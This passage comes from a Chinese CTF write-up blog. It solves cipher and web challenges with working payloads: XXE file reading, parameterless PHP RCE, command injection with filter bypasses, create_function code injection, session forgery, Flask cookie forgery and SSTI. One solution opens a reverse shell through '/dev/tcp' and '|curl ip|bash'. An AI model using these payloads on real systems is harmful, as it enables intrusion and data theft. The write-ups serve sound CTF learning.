or Wadjigu in Australia (one, with a question-mark): none of these seems to have much chance of survival</span><br></pre></td></tr></table></figure>

<p>待解密文：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">givfome</span><br></pre></td></tr></table></figure>

<p>解题过程</p>
<p>进行字频统计得出如下结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e &#x3D;&gt;g</span><br><span class="line">a &#x3D;&gt;i</span><br><span class="line">n &#x3D;&gt;v</span><br><span class="line">t &#x3D;&gt;f</span><br><span class="line">o &#x3D;&gt;o</span><br><span class="line">s &#x3D;&gt;m</span><br><span class="line">i &#x3D;&gt;e</span><br><span class="line">r &#x3D;&gt;j</span><br><span class="line">l &#x3D;&gt;t</span><br><span class="line">h &#x3D;&gt;l</span><br><span class="line">u &#x3D;&gt;y</span><br><span class="line">d &#x3D;&gt;s</span><br><span class="line">g &#x3D;&gt;h</span><br><span class="line">p &#x3D;&gt;n</span><br><span class="line">c &#x3D;&gt;u</span><br><span class="line">m &#x3D;&gt;c</span><br><span class="line">f &#x3D;&gt;z</span><br><span class="line">w &#x3D;&gt;k</span><br><span class="line">y &#x3D;&gt;b</span><br><span class="line">v &#x3D;&gt;w</span><br><span class="line">k &#x3D;&gt;r</span><br><span class="line">c &#x3D;&gt;q</span><br><span class="line">p &#x3D;&gt;d</span><br><span class="line">t &#x3D;&gt;p</span><br><span class="line">x &#x3D;&gt;x</span><br><span class="line">j &#x3D;a</span><br></pre></td></tr></table></figure>

<ul>
<li>加密脚本</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">s = <span class="string">&quot;eantosi&quot;</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	k=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">		i = i.lower()</span><br><span class="line">		<span class="keyword">if</span> j == i:</span><br><span class="line">			l =(<span class="number">19</span>*k+<span class="number">18</span>)%<span class="number">26</span>	</span><br><span class="line">			m = m + table[l]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			k = k+<span class="number">1</span>	</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;eantosi&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="G2mtu学生？"><a href="#G2mtu学生？" class="headerlink" title="G2mtu学生？"></a>G2mtu学生？</h3><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;0&quot;</span>, time()+<span class="number">360</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SERVER[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]!=<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;u no student in Gzmtu&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;flag&#123;welcom_to_GZMTU_56456s4awdawdafafa&#125;&quot;</span>;		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;u no admin!&quot;</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>xff伪造ip为127.0.0.1然后改cookie未授权访问即可获取到flag</p>
<h3 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h3><p>考点</p>
<ul>
<li>XXE外部实体注入</li>
</ul>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$resp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="literal">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;请输入姓名&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;feedback&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;author&gt;&#x27;</span> + document.getElementById(<span class="string">&#x27;name&#x27;</span>).value+ <span class="string">&#x27;&lt;/author&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;/feedback&gt;&#x27;</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">&#x27;title&#x27;</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;index.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>解题思路</p>
<p>xxe外部实体注入+伪协议读取源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;feedback&gt;</span><br><span class="line">&lt;author&gt;&amp;xxe;&lt;/author&gt;</span><br><span class="line">&lt;/feedback&gt;</span><br></pre></td></tr></table></figure>

<p>抓包改一下，再base64解密即可得到flag</p>
<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>过滤诸多，将常用的数组控制函数给ban了，session也ban了，文件显示的<strong>show_souce</strong>以及<strong>highlight_file</strong>也没了，能用的函数查阅完，最终有个控制数组的随机数函数<strong>array_rand</strong>以及文件<strong>file_get_contents</strong>，选择当前目录的函数有个<strong>current</strong>组合起来就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>但是后边又过滤了flag，而flag在flag.php，读到就会die掉，所以需要加密，常用的加密base64已经被过滤了，选择使用十六进制加密，最终payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>

<p>读取的时候有些文件也会被读取进来，因为是随机读取，每次出现不一样的十六进制，都需要多解密看看，解密代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="string">&quot;3c3f7068700d0a2f2f666c61677b31353166306361642d376338322d346164312d383230332d3536636333366461393564307d0d0a3f3e&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>解开得flag</p>
<h3 id="神奇的输入框"><a href="#神奇的输入框" class="headerlink" title="神奇的输入框"></a>神奇的输入框</h3><p>这道题是一道无回显的ping命令</p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[<span class="string">&#x27;submit&#x27;</span>]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[<span class="string">&#x27;site&#x27;</span>];</span><br><span class="line">            <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解法一</li>
</ul>
<p>利用<code>&gt;</code>把我们需要执行的命令写入文件里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>访问1.txt然后看到flagggg.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat flagggg.php&gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>或者反引号执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;cat flagggg.php&gt; 1.txt&#96;</span><br></pre></td></tr></table></figure>

<p>即可得到flag</p>
<ul>
<li>解法二</li>
</ul>
<p>直接反弹一个shell</p>
<p>在vps监听1234端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>

<p>在vps的/var/www/html写入bash反弹语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>然后回到输入框下输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|curl ip|bash</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120730923.png" alt="image-20201119120730923"></p>
<p>tips：因为docker靶机的环境问题可能无法写shell，以及无法使用dnslog外带数据。</p>
<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>弱口令admin/admin8888登录后台</p>
<ul>
<li>解法一</li>
</ul>
<p>文件包含漏洞</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132632586.png" alt="image-20201119132632586"></p>
<p>插入php代码</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132855855.png" alt="image-20201119132855855"></p>
<p>改一下页面</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133034032.png" alt="image-20201119133034032"></p>
<p>然后点击前台的关于我们</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133206501.png" alt="image-20201119133206501"></p>
<p>点进去即可获得flag</p>
<ul>
<li>其他解法</li>
</ul>
<p>百度xiaocms漏洞，有现成的getshell方法</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>xmctf</title>
    <url>/2020/12/17/xmctf/</url>
    <content><![CDATA[<p>星盟战队的考核题，一共做了8道题，记录一下解题过程<a id="more"></a></p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217195705321.png" alt="image-20201216234950487"></p>
<h3 id="web3-考核"><a href="#web3-考核" class="headerlink" title="web3-考核"></a>web3-考核</h3><p>题目源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">&#x27;content&#x27;</span>] ? <span class="string">&quot;---mylocalnote---\n&quot;</span> . $_GET[<span class="string">&#x27;content&#x27;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">$name = @$_GET[<span class="string">&#x27;name&#x27;</span>] ? $_GET[<span class="string">&#x27;name&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name);</span><br><span class="line">str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">&quot;/tmp/&quot;</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Thank u,<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure>

<p>题目提示flag在flag.php下，访问提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u are not admin,only admin can see flag!</span><br></pre></td></tr></table></figure>

<p>根据提示说只有admin才可以看到flag，说明我们需要满足<code>$_SESSION[&#39;username&#39;]=&#39;admin&#39;</code>，刚好题目中又存在<code>file_put_contents</code>函数可以往<code>/tmp</code>目录下写文件，使用burpsuite抓包的时候看到有个PHPSESSID，可以想到php中默认存储的文件名为<code>sess_PHPSESSID</code>，那么就可以往里面写入伪造用户的信息了，php默认的存储引擎格式为：键名+竖线+经过serialize()函数处理的值，所以我们可以写入的伪造信息为<code>username|s:6:&#39;admin&#39;;</code>，但是题目前面给我们拼接了一串字符<code>&quot;---mylocalnote---\n&quot;</code>，所以我们需要闭合一下，把他当做一个键值，就不会影响到我们后面的东西了</p>
<p>伪造好session信息后，访问flag.php即可获得flag，这里给出exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8809/&quot;</span></span><br><span class="line">response = r.get(url)</span><br><span class="line">PHPSESSID = response.cookies[<span class="string">&quot;PHPSESSID&quot;</span>]</span><br><span class="line">payload = <span class="string">&#x27;?content=|N;username|s:5:&quot;admin&quot;;&amp;name=sess_&#x27;</span>+PHPSESSID</span><br><span class="line">r.get(url+payload)</span><br><span class="line">url2 = <span class="string">&quot;http://xmctf.top:8809/flag.php&quot;</span></span><br><span class="line">response2 = r.get(url2+payload)</span><br><span class="line">flag = response2.text</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216154253806.png" alt="image-20201217195705321"></p>
<h3 id="RCE-训练"><a href="#RCE-训练" class="headerlink" title="RCE-训练"></a>RCE-训练</h3><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($ip)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|`| |&amp;|cp|mv|cat|tail|more|rev|tac|\*|\&#123;)/i&quot;</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;hack&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;no!&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  var_dump($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目过滤了一些字符，可以使用base64+<code>%09</code>绕一下过滤，直接拿祥云杯Command这题的payload就能打，先用<code>ls /</code>找到flag在根目录下，然后直接<code>cat /flag</code>就行了，这里直接给出exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8931/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?ip=|echo%09%22Y2F0IC9mbGFn%22|base64%09-d|ba\s\h&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">result = response.text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216164519144.png" alt="image-20201216164519144"></p>
<h3 id="easy-web-考核"><a href="#easy-web-考核" class="headerlink" title="easy-web-考核"></a>easy-web-考核</h3><p>题目源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">&quot;bad&quot;</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">&#x27;bad&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;badbad!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;666&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>一开始看到<code>extract</code>函数又看到<code>$key</code>必须全等于bad，很明显的变量覆盖，我们直接使用key=1即可绕过，然后看到<code>$act($arg,&#39;&#39;);</code>，在y1ng师傅之前出的一道题目[BJDCTF2020]EzPHP里面看到 过，不难想到用<code>create_function</code>函数来做这道题，首先需要用<code>\</code>来绕过这个正则，然后<code>create_function</code>这个函数第一个param是声明变量，第二个param是传递执行的代码</p>
<p>然后这道题目第二个param是为空的，所以我们需要在第一个param用<code>)&#123;&#125;</code>来闭合前面的方法，然后用<code>//</code>来注释后面没用的部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;)&#123;&#125;phpinfo();//&#x27;</span>;</span><br><span class="line">$myFunc = create_function($a,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">//效果如下</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"></span>)</span>&#123;&#125;phpinfo();<span class="comment">//)&#123;&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里直接给个exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8848&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?act=\create_function&amp;arg=)&#123;&#125;system(&quot;cat /ffflll4g&quot;);//&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">response = r.post(url+payload,data=data)</span><br><span class="line">result = response.text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216173217133.png" alt="image-20201216154253806"></p>
<h3 id="web8-考核"><a href="#web8-考核" class="headerlink" title="web8-考核"></a>web8-考核</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Only the admin can get the flag,flag in &#x2F;flag</span><br><span class="line"></span><br><span class="line">you name is None</span><br></pre></td></tr></table></figure>

<p>提示只有admin用户才能够得到flag，burp抓包之后发现jwt编码的cookie，猜测需要jwt伪造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xmctf.top:8850&#x2F;?name&#x3D;&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>&#123;&#123;config&#125;&#125;</code>中发现了密钥<code>woshicaiji</code></p>
<p>然后使用<code>flask_session_cookie_manager</code>脚本伪造成admin即可</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216234950487.png" alt="image-20201216235940134"></p>
<p>这里给个exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8850/flag&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.X9osaw.dYn7Gi00wAWefFCApz5jqOdYjsU&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = r.get(url,headers=headers)</span><br><span class="line">result = response.text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216235940134.png" alt="image-20201217104001551"></p>
<h3 id="web11-考核"><a href="#web11-考核" class="headerlink" title="web11-考核"></a>web11-考核</h3><p>本题考察的点为SSTI，随手试了一下发现<code>?name=kawhi</code>，会回显，于是fuzz一下</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217104001551.png" alt="image-20201216173217133"></p>
<p>主要过滤了<code>_</code>和<code>.</code>，还发现过滤了<code>args</code>，可以想到用<code>values</code>绕过，但不知道为何我使用<code>values</code>绕过的时候会报一个500的错误，于是此方法作罢，但可以使用16进制绕过，先跑跑索引吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

